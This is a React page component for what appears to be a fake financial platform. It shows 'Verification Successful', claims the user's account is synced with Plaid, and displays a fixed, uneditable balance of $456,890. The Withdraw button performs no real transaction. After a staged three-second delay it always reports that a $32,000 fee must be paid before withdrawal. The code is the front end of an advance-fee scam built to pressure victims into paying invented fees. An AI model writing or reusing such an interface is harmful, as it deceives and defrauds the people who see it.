import React, { useState, useEffect } from 'react';
import './home.css';

import moment from 'moment';
import { useNavigate,Link , useLocation} from 'react-router-dom';

import Nav from './dashboard/nav';
import logo from './logo.svg';
import social from './social.png';
import footer from './footer.svg';


import {db, auth, storage} from './firebase';

import axios from 'axios'

import { collection, getDocs, where, query, doc, setDoc,deleteDoc } from "firebase/firestore";
import hero from './hero.jpeg';
import { ref, uploadBytes, getDownloadURL } from "firebase/storage";


import Swal from 'sweetalert2';



function Complete(){


    const location  = useLocation();
    const navigate = useNavigate();


   
    


    // useEffect(() => {
       
    //     // window.location.reload();
    
      
    
    //   }, []); 


    //   application data

    
 const[amount, setAmount] = useState("$ 456,890")


    const[loading, setLoading] = useState(false);
    const[showError, setShowError] = useState(false);


     function handleWithdraw(e){
        e.preventDefault();

        setLoading(true);
        setShowError(false);

        setTimeout(function() {
            setLoading(false);
            setShowError(true);
        }, 3000);
     }

    return(
        <>
        <div className='row main'>
             <Nav />

                  


               
              




                <div className='col-md-9 full bg-light m-0 px-0'>
                    <br>
                    </br>
                   
                   <br></br>

                 

                 <div className='card col-md-6 m-auto px-4 py-2 rounded'>

                     <div className='text-center'>
                     

                <h4 className='intro'>Verification Successful </h4>
                     </div>


{!showError &&
                     <div className='alert alert-success col-11 rounded shadow m-auto py-2'>

                     <h5 className='topic'>Account Connected </h5>
<p className='topicpara'>You have successfully sync your account with Plaid.</p>

                         

</div>
}


{showError && 
<div className='alert alert-danger col-11 rounded shadow m-auto py-2'>

<h5 className='topic'>Withdrawal Error </h5>
<p className='topicpara'>Unable to withdraw, you need to pay a fee of $32,000 to complete the Withdrawal process</p>

    

</div>

}

<br>
</br>


        <form onSubmit={handleWithdraw} className='py-3'>
            <div className='form-group'>
            <label>Amount to Withdraw</label>

<               input type="text"value={amount} className='form-control'disabled />
            </div>

            <br>
            </br>


            <button className='btn btn-success text-center w-100'>Withdraw</button>
        </form>


          

            

                 </div>


               
                  

                 
             


               



    



               
               
                </div>


                
                </div>

        </>
    );
}

export default Complete;